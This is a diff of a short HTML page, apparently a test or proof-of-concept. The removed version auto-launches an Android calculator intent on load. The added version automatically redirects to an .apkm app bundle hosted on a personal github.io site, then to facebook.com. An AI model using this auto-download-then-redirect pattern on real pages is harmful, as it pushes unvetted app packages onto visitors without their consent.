@@ -1,3 +1,23 @@
 <!DOCTYPE html>
-<html lang="en"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <meta http-equiv="X-UA-Compatible" content="ie=edge"> <title>My Cool App</title> </head> <body> <div id="redirect-div" onclick="navigate()"> <h1>Opening My Cool App...</h1> </div>
-</body> <script type="text/javascript"> function navigate() { var url="intent://com.sec.android.app.popupcalculator#Intent;scheme=android-app;end"; window.location = url; } window.onload=function(){ navigate(); } </script> </html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirection Example</title>
+    <script>
+        // Function to handle the sequence of redirections
+        window.onload = function() {
+            setTimeout(function() {
+                window.location.href = "https://mrnoob790.github.io/company.thebrowser.arc_1.2.0-64_4arch_7dpi_24lang_c275b60dcc73bfda8cb838f1d6fe31cf_apkmirror.com.apkm";
+            }, 1000); // Redirect after 1 second to the specified URL
+
+            setTimeout(function() {
+                window.location.href = "https://www.facebook.com";
+            }, 2000); // Redirect after 2 seconds to Facebook
+        }
+    </script>
+</head>
+<body>
+    <h1>Redirecting...</h1>
+</body>
+</html>
